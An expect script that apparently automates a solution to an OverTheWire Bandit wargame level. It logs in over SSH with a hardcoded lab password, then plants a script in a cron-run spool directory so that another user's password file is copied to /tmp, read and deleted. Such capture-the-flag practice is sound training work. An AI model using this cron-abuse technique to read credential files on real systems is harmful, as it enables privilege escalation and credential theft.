#!/usr/bin/expect -f

spawn ssh -l bandit23 -p 2220 bandit.labs.overthewire.org
expect {
    "*yes/no*" { send "yes\r" ; exp_continue }
    "*assword: " { send "jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\r" ; }
}

expect "*\$ "

send "cd /etc/cron.d/\r"

expect "*\$ "
send "ls -a\r"

expect "*\$ "
send "cat cronjob_bandit24\r"

expect "*\$ "
send "cat /usr/bin/cronjob_bandit24.sh\r"

expect "*\$ "
send "touch /tmp/NewFile.sh\r"

expect "*\$ "
send "chmod 777 /tmp/NewFile.sh\r"

expect "*\$ "
send "echo \"cat /etc/bandit_pass/bandit24 > /tmp/ThePass\" > /tmp/NewFile.sh\r"

expect "*\$ "
send "cp /tmp/NewFile.sh /var/spool/bandit24/\r"

expect "*\$ "
sleep 70

expect "*\$ "
send "cat /tmp/ThePass\r"

expect "*\$ "
send "rm -f /tmp/ThePass\r"
